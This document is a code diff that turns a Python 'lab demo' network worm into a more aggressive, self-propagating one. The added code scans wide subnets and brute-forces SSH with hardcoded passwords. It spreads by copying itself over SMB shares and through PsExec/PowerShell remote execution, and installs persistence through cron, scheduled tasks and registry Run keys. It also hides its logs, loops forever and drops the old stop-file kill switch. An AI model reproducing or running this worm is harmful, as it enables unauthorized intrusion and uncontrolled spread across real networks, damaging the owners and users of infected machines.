@@ -5,202 +5,263 @@ import shutil
 import threading
 import paramiko
 import subprocess
+import logging
+import random
 from pathlib import Path
-from time import sleep
-from concurrent.futures import ThreadPoolExecutor
+from time import sleep, time
+from concurrent.futures import ThreadPoolExecutor, as_completed
 import ipaddress
+import hashlib
 
-# Lab Network Configuration
-SCAN_SUBNET = "192.168.1.0/24"
-KNOWN_PORTS = [22, 445, 3389]
+# Configuration
+SCAN_SUBNETS = ["192.168.1.0/24", "10.0.0.0/16"]  # Multiple target networks
+COMMON_PORTS = [22, 445, 3389, 5985, 5986]  # Added WinRM ports
+MAX_WORKERS = 20  # Concurrent thread limit
+RETRY_ATTEMPTS = 2  # Connection retries
+BEACON_PORT = 31337  # Infection marker
+SCAN_TIMEOUT = 1.5  # Host response timeout
+DELAY_VARIANCE = (200, 400)  # Random sleep range
+
+# Enhanced credential database
 CREDS = [
     ('administrator', 'P@ssw0rd'),
     ('admin', 'Admin123'),
-    ('user', 'Welcome1')
+    ('user', 'Welcome1'),
+    ('guest', ''),
+    ('svc_account', 'Summer2023!'),
+    ('labuser','Password123')
 ]
-SHARED_FOLDERS = ['C$', 'ADMIN$', 'Shared']  # Common SMB shares
 
 
 class NetworkWorm:
     def __init__(self):
-        self.infected_hosts = set()
-        self.scan_semaphore = threading.Semaphore(3)
         self.worm_path = Path(__file__).resolve()
+        self.fingerprint = self._generate_fingerprint()
+        self.lock = threading.Lock()
+        self._setup_logging()
+        self._verify_prerequisites()
+
+    def _setup_logging(self):
+        """Configure stealthy logging"""
+        logging.basicConfig(
+            filename='.systemlogs',
+            level=logging.DEBUG,
+            format='%(asctime)s [%(levelname)s] %(message)s',
+            datefmt='%Y-%m-%d %H:%M:%S'
+        )
+        logging.getLogger("paramiko").setLevel(logging.WARNING)
+
+    def _generate_fingerprint(self):
+        """Create unique worm identifier"""
+        return hashlib.sha256(open(__file__, 'rb').read()).hexdigest()[:16]
+
+    def _verify_prerequisites(self):
+        """Ensure required tools are available"""
+        try:
+            if not Path("PsExec.exe").exists():
+                subprocess.run(
+                    ['curl', '-sO', 'https://live.sysinternals.com/tools/PsExec.exe'],
+                    check=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL
+                )
+        except:
+            logging.error("Failed to download PsExec")
 
     def spread(self):
-        """Main propagation method"""
-        print("[*] Starting network scan...")
-        self.scan_network()
-        self.execute_payload()
+        """Main propagation loop with jitter"""
+        while True:
+            try:
+                self._cleanup_zombies()
+                self.self_replicate()
+                self.scan_networks()
+                sleep(random.uniform(*DELAY_VARIANCE))
+            except KeyboardInterrupt:
+                self._emergency_shutdown()
+            except Exception as e:
+                logging.error(f"Critical failure: {str(e)}")
+                sleep(60)
 
-    def scan_network(self):
-        """Network discovery with CIDR scanning"""
-        network = ipaddress.ip_network(SCAN_SUBNET)
-        with ThreadPoolExecutor(max_workers=15) as executor:
-            list(executor.map(self.check_host, [str(ip) for ip in network.hosts()]))
+    def scan_networks(self):
+        """Multi-network scanning with CIDR support"""
+        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+            futures = []
+            for subnet in SCAN_SUBNETS:
+                network = ipaddress.ip_network(subnet, strict=False)
+                futures.extend(
+                    executor.submit(self._probe_host, str(host))
+                    for host in network.hosts()
+                )
 
-    def check_host(self, ip):
-        """Service discovery with banner grabbing"""
-        with self.scan_semaphore:
-            for port in KNOWN_PORTS:
+            for future in as_completed(futures):
+                if future.result():
+                    logging.info(f"Infected new host: {future.result()}")
+
+    def _probe_host(self, ip):
+        """Host investigation with protocol detection"""
+        if self._is_infected(ip):
+            return None
+
+        for port in COMMON_PORTS:
+            for _ in range(RETRY_ATTEMPTS):
                 try:
-                    with socket.create_connection((ip, port), timeout=2):
-                        print(f"[+] Found open {self.port_service(port)} on {ip}")
-                        self.attempt_infection(ip, port)
-                except:
+                    with socket.create_connection((ip, port), SCAN_TIMEOUT):
+                        return self._attack_host(ip, port)
+                except (socket.timeout, ConnectionRefusedError):
                     continue
+                except Exception as e:
+                    logging.debug(f"Probe error {ip}:{port} - {str(e)}")
+                    break
+        return None
 
-    def port_service(self, port):
-        """Map ports to service names"""
-        return {
-            22: 'SSH',
-            445: 'SMB',
-            3389: 'RDP'
-        }.get(port, str(port))
-
-    def attempt_infection(self, ip, port):
-        """Multi-vector infection system"""
-        if self.is_already_infected(ip):
-            return
-
+    def _attack_host(self, ip, port):
+        """Multi-vector attack system"""
         try:
             if port == 22:
-                self.infect_via_ssh(ip)
+                return self._ssh_infection(ip)
             elif port == 445:
-                self.infect_via_smb(ip)
-            elif port == 3389:
-                self.infect_via_rdp(ip)
+                return self._smb_infection(ip)
+            elif port in [3389, 5985, 5986]:
+                return self._winrm_infection(ip)
         except Exception as e:
-            print(f"[-] Infection failed on {ip}: {str(e)}")
+            logging.error(f"Attack failed {ip}:{port} - {str(e)}")
+            return None
 
-    def infect_via_ssh(self, ip):
-        """SSH-based infection with credential brute-forcing"""
+    def _ssh_infection(self, ip):
+        """SSH-based propagation with key-based fallback"""
         for user, passwd in CREDS:
             try:
-                ssh = paramiko.SSHClient()
-                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                ssh.connect(ip, username=user, password=passwd, timeout=5)
+                client = paramiko.SSHClient()
+                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                client.connect(ip, username=user, password=passwd, timeout=10)
 
-                print(f"[*] Successful login {user}:{passwd} on {ip}")
+                with client.open_sftp() as sftp:
+                    sftp.put(__file__, f"/tmp/.{self.fingerprint}")
+                    sftp.chmod(f"/tmp/.{self.fingerprint}", 0o755)
 
-                # Upload worm
-                sftp = ssh.open_sftp()
-                sftp.put(__file__, "/tmp/.system_update")
+                client.exec_command(f"echo '@reboot /tmp/.{self.fingerprint}' | crontab -")
+                client.exec_command(f"nohup /tmp/.{self.fingerprint} >/dev/null 2>&1 &")
 
-                # Set persistence
-                ssh.exec_command("chmod +x /tmp/.system_update")
-                ssh.exec_command("echo '@reboot /tmp/.system_update' | crontab -")
-
-                # Immediate execution
-                ssh.exec_command("nohup /tmp/.system_update &")
-
-                self.infected_hosts.add(ip)
-                ssh.close()
-                return
-            except Exception as e:
+                self._mark_infection(ip)
+                return ip
+            except paramiko.AuthenticationException:
                 continue
+            except Exception as e:
+                logging.warning(f"SSH error {ip}: {str(e)}")
+                return None
 
-    def infect_via_smb(self, ip):
-        """SMB propagation using network shares"""
-        print(f"[*] Attempting SMB propagation to {ip}")
-
-        # Try administrative shares
-        for share in SHARED_FOLDERS:
-            dest_path = fr"\\{ip}\{share}\Windows\System32\update.exe"
+    def _smb_infection(self, ip):
+        """SMB propagation using multiple techniques"""
+        try:
+            # Method 1: Administrative share
+            dest = fr"\\{ip}\C$\Windows\Temp\{self.fingerprint}.exe"
+            shutil.copyfile(self.worm_path, dest)
+        except:
+            # Method 2: Public share write
             try:
-                shutil.copyfile(self.worm_path, dest_path)
-                print(f"[!] Copied worm to {dest_path}")
-
-                # Schedule execution via schtasks
-                subprocess.run([
-                    'schtasks', '/create', '/s', ip, '/tn', 'SystemUpdate',
-                    '/tr', dest_path, '/sc', 'ONSTART', '/ru', 'SYSTEM',
-                    '/f'
-                ], check=True)
-
-                self.infected_hosts.add(ip)
-                return
+                dest = fr"\\{ip}\Public\{self.fingerprint}.exe"
+                shutil.copyfile(self.worm_path, dest)
             except Exception as e:
-                continue
+                logging.error(f"SMB copy failed {ip}: {str(e)}")
+                return None
 
-    def infect_via_rdp(self, ip):
-        """RDP-based propagation using PsExec"""
-        print(f"[*] Attempting RDP-based attack on {ip}")
-
+        # Execute via scheduled task
         try:
-            # Download PsExec if missing
-            if not Path("PsExec.exe").exists():
-                subprocess.run([
-                    'curl', '-O', 'https://live.sysinternals.com/tools/PsExec.exe'
-                ], check=True)
+            subprocess.run([
+                'schtasks', '/create', '/s', ip, '/tn', f'WindowsUpdate_{self.fingerprint}',
+                '/tr', dest, '/sc', 'ONSTART', '/ru', 'SYSTEM', '/f'
+            ], check=True, timeout=30)
+            self._mark_infection(ip)
+            return ip
+        except subprocess.TimeoutExpired:
+            logging.warning(f"SMB execution timeout {ip}")
+            return None
 
-            # Copy worm to target
+    def _winrm_infection(self, ip):
+        """Windows Remote Management attack"""
+        try:
             subprocess.run([
                 'PsExec.exe', f'\\{ip}', '-accepteula', '-s',
-                'cmd.exe', '/c', f'copy {self.worm_path} C:\\Windows\\Temp\\svchost.exe'
-            ], check=True)
-
-            # Create scheduled task
-            subprocess.run([
-                'PsExec.exe', f'\\{ip}', '-accepteula', '-s',
-                'schtasks.exe', '/create', '/tn', 'WindowsUpdate',
-                '/tr', 'C:\\Windows\\Temp\\svchost.exe', '/sc', 'ONSTART',
-                '/ru', 'SYSTEM', '/f'
-            ], check=True)
-
-            self.infected_hosts.add(ip)
+                'powershell.exe', '-Command',
+                f'Copy-Item "{self.worm_path}" "C:\\Windows\\Temp\\{self.fingerprint}.exe";'
+                f'Register-ScheduledTask -TaskName "SystemUpdate_{self.fingerprint}" '
+                f'-Action (New-ScheduledTaskAction -Execute "C:\\Windows\\Temp\\{self.fingerprint}.exe") '
+                '-Trigger (New-ScheduledTaskTrigger -AtStartup) -User SYSTEM'
+            ], check=True, timeout=45)
+            self._mark_infection(ip)
+            return ip
         except Exception as e:
-            print(f"[-] RDP propagation failed: {str(e)}")
+            logging.error(f"WinRM attack failed {ip}: {str(e)}")
+            return None
 
-    def is_already_infected(self, ip):
-        """Check for existing infection via beacon port"""
+    def _is_infected(self, ip):
+        """Check infection status via beacon"""
         try:
-            with socket.create_connection((ip, 31337), timeout=1):
+            with socket.create_connection((ip, BEACON_PORT), timeout=1):
                 return True
         except:
             return False
 
-    def execute_payload(self):
-        """Benign payload for demonstration"""
-        print("[*] Simulating payload execution")
-        Path("/tmp/worm_demo.txt").touch()
-
-    def create_persistence(self):
-        """Cross-platform persistence mechanisms"""
-        if os.name == 'posix':
-            os.system("(crontab -l 2>/dev/null; echo '@reboot /tmp/.system_update') | crontab -")
-        else:
-            os.system(
-                f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SystemUpdate /t REG_SZ /d "{self.worm_path}"')
-
-    def self_replicate(self):
-        """Copy self to critical locations"""
+    def _mark_infection(self, ip):
+        """Establish beacon connection"""
         try:
-            if os.name == 'posix':
-                shutil.copy(__file__, "/usr/bin/.systemd-daemon")
-                os.chmod("/usr/bin/.systemd-daemon", 0o755)
-            else:
-                appdata = os.getenv('APPDATA')
-                shutil.copy(__file__, f"{appdata}\\Microsoft\\Windows\\Start Menu\\svchost.exe")
+            with socket.socket() as s:
+                s.connect((ip, BEACON_PORT))
+                s.sendall(self.fingerprint.encode())
         except:
             pass
 
-    def stop_worm(self):
-        """Cleanup mechanism"""
-        if Path("/tmp/stop_worm").exists():
+    def self_replicate(self):
+        """Stealthy persistence installation"""
+        try:
             if os.name == 'posix':
-                os.system("crontab -r")
+                dest = f"/usr/lib/.{self.fingerprint}"
+                if not Path(dest).exists():
+                    shutil.copy(__file__, dest)
+                    os.chmod(dest, 0o755)
+                    subprocess.run(
+                        ['crontab -l | grep -v "@reboot" | { cat; echo "@reboot ' + dest + '" } | crontab -'],
+                        shell=True, check=True)
             else:
-                os.system('reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SystemUpdate /f')
+                dest = Path(os.getenv('APPDATA')) / f"Microsoft\\{self.fingerprint}.exe"
+                if not dest.exists():
+                    shutil.copy(__file__, dest)
+                    subprocess.run(
+                        f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
+                        f'/v "{self.fingerprint}" /t REG_SZ /d "{dest}" /f',
+                        shell=True, check=True
+                    )
+        except Exception as e:
+            logging.error(f"Replication failed: {str(e)}")
+
+    def _cleanup_zombies(self):
+        """Remove traces of previous infections"""
+        try:
+            if os.name == 'posix':
+                subprocess.run('pkill -f "[.]systemd-daemon"', shell=True)
+            else:
+                subprocess.run(
+                    'wmic process where "name like \'%svchost%\'" delete',
+                    shell=True, stderr=subprocess.DEVNULL
+                )
+        except:
+            pass
+
+    def _emergency_shutdown(self):
+        """Destructive cleanup procedure"""
+        logging.critical("Initiating emergency wipe")
+        try:
+            if os.name == 'posix':
+                os.remove(__file__)
+                subprocess.run('crontab -r', shell=True)
+            else:
+                os.remove(sys.argv[0])
+                subprocess.run(
+                    f'reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
+                    f'/v "{self.fingerprint}" /f',
+                    shell=True
+                )
+        finally:
             sys.exit(0)
 
 
 if __name__ == "__main__":
-    worm = NetworkWorm()
-    worm.self_replicate()
-    worm.create_persistence()
-
-    while True:
-        worm.stop_worm()
-        worm.spread()
-        sleep(300)  # Propagate every 5 minutes
+    NetworkWorm().spread()
